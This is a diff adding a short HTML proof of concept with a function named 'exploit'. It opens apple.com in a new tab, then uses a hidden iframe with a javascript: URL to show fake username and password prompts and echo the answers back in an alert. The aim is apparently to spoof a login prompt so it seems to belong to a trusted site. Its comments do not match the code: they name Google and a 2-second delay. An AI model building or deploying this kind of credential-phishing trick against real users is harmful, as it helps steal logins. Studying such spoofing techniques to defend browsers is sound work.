@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      function exploit() {
+        // Membuka tab Google asli
+        window.open("https://www.apple.com");
+
+        // Delay 2 detik sebelum menampilkan prompt palsu
+        setTimeout(function () {
+          document.getElementById("iframe").src =
+            "javascript:let username = prompt('Enter your username');" +
+            "let password = prompt('Enter your password');" +
+            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
+        }, 3000); // 2000 ms = 2 detik
+      }
+    </script>
+
+      <button onclick="exploit()">Click</button>
+    </a>
+
+    <iframe id="iframe" style="display:none;" src=""></iframe>
+  </body>
+</html>
